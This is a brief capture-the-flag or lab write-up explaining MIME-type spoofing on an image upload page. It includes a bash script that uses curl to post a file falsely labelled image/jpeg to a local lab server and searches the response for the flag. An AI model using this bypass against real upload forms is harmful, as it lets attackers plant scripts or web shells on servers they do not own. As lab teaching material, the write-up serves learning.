# Mime spoofing

The website have page to upload files, but it only accepts images. If the server is not properly protected and just check the Mime type, we can upload a script disguised as an image. Let's do a simple bash script that will simulate this :
```bash
ip="192.168.56.105"
script="/tmp/bad_script.sh"

touch "$script"
curl -s -X POST "$ip/index.php?page=upload" \
	-F "uploaded=@$script;type=image/jpeg" \
	-F "Upload=Upload"  \
	| grep 'flag'

rm "$script"
```